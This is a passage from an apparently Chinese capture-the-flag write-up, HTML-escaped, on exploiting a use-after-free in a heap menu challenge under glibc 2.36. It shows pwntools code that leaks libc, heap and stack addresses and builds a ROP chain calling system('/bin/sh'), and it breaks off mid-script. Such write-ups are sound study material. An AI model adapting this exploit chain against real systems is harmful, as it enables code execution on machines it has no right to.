class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    add(i+&lt;span class=&#34;number&#34;&gt;30&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;/bin/sh\x00&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x3f8&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;dddd&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;delete(&lt;span class=&#34;number&#34;&gt;31&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;show(&lt;span class=&#34;number&#34;&gt;31&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;Name: &amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.recv(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;lib_addr=u64(p.recv(&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;).ljust(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;))-&lt;span class=&#34;number&#34;&gt;96&lt;/span&gt;-&lt;span class=&#34;number&#34;&gt;0x1f6c60&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;libc: &amp;#x27;&lt;/span&gt;+&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(lib_addr))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		分配的0x3f8再加上33 还是啥,大小肯定超了tcache的了,就直接进入unsortedbin,然后可以从这里泄露glibc的地址&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-26-2-36%E7%89%88%E6%9C%ACuaf%E5%88%A9%E7%94%A8/image-20230517152943496.png&#34; alt=&#34;image-20230517152943496&#34;&gt;&lt;/p&gt;
&lt;p&gt;​		-96  再减去和glibc开头的差值,就可以得到glibc加载基址&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-26-2-36%E7%89%88%E6%9C%ACuaf%E5%88%A9%E7%94%A8/image-20230517153205330.png&#34; alt=&#34;image-20230517153205330&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;构造rop链子&#34;&gt;&lt;a href=&#34;#构造rop链子&#34; class=&#34;headerlink&#34; title=&#34;构造rop链子&#34;&gt;&lt;/a&gt;构造rop链子&lt;/h2&gt;&lt;p&gt;​		这里直接覆盖的返回地址,exit退出,就会进入rop链&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;libc = ELF(&lt;span class=&#34;string&#34;&gt;&amp;quot;./libc.so.6&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;system=lib_addr+libc.sym[&lt;span class=&#34;string&#34;&gt;&amp;quot;system&amp;quot;&lt;/span&gt;] &lt;span class=&#34;comment&#34;&gt;#0x4c330&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bin_sh=lib_addr+&lt;span class=&#34;number&#34;&gt;0x1b61b4&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(system))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(bin_sh))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ret=&lt;span class=&#34;number&#34;&gt;0x00000000000233d1&lt;/span&gt;+lib_addr&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pop_rdi=&lt;span class=&#34;number&#34;&gt;0x00023b65&lt;/span&gt;+lib_addr&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rop_chain=p64(ret)*&lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;+p64(pop_rdi)+p64(bin_sh)+p64(system)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;## edit&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;edit(&lt;span class=&#34;number&#34;&gt;15&lt;/span&gt;,rop_chain)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;gt; &amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;5&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;





&lt;h1 id=&#34;exp&#34;&gt;&lt;a href=&#34;#exp&#34; class=&#34;headerlink&#34; title=&#34;exp&#34;&gt;&lt;/a&gt;exp&lt;/h1&gt;&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;99&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;100&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;101&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;102&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;103&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;104&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;105&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf = &lt;span class=&#34;string&#34;&gt;&amp;quot;./pwn&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.log_level= &lt;span class=&#34;string&#34;&gt;&amp;quot;debug&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p = process(elf)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.terminal = [&lt;span class=&#34;string&#34;&gt;&amp;#x27;tmux&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;splitw&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;-h&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#gdb.attach(p)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;add&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;index, name, size,content&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;gt; &amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;1&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;#x27;Index: &amp;#x27;&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(index))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.sendafter(&lt;span class=&#34;string&#34;&gt;&amp;#x27;Name: &amp;#x27;&lt;/span&gt;, name)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;#x27;Description size: &amp;#x27;&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(size))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.sendafter(&lt;span class=&#34;string&#34;&gt;&amp;#x27;Description: &amp;#x27;&lt;/span&gt;,content)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;edit&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;index, content&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;gt; &amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;4&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;#x27;Index: &amp;#x27;&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(index))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;#x27;Description: &amp;#x27;&lt;/span&gt;, content)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;show&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;index&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;gt; &amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;3&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;#x27;Index: &amp;#x27;&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(index))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;delete&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;index&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;gt; &amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;2&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;#x27;Index: &amp;#x27;&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(index))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;## 观察怎么泄露的地址&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;test&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;ddd&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;show(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;recv = p.recv(&lt;span class=&#34;number&#34;&gt;0xe&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fake_stack_addr = u64(p.recv(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(fake_stack_addr))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fake_lib_addr = u64(p.recv(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(fake_lib_addr))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    add(i+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;aaa&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x8&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;aaa&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x8&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;dddd&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;9&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;aaa&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x8&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;dddd&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;aaa&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x8&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;dddd&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;11&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;ddd&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    delete(i+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;delete(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;show(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;Name: &amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sec=u64(p.recv(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;delete(&lt;span class=&#34;number&#34;&gt;9&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;show(&lt;span class=&#34;number&#34;&gt;9&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;Name: &amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;heap_sec=u64(p.recv(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;heap_addr=heap_sec^sec&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(heap_addr))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;stack_addr=u64(p.recv(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(stack_addr))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;delete(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;victim=stack_addr-&lt;span class=&#34;number&#34;&gt;0x20&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(victim))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i 